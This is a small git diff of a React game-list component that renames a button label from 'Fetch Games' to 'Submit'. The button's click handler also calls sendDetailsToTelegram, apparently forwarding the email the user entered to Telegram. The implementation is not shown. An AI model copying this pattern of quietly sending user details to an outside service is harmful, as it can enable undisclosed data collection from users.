@@ -95,7 +95,7 @@ const GameList: React.FC = () => {
         value={email}
         onChange={(e) => setEmail(e.target.value)}
       />
-      <Button mode='secondary' onClick={() => { fetchGames(); sendDetailsToTelegram(); }}>Fetch Games</Button>
+      <Button mode='secondary' onClick={() => { fetchGames(); sendDetailsToTelegram(); }}>Submit</Button>
       {loading ? (
         <p>Loading...</p>
       ) : (
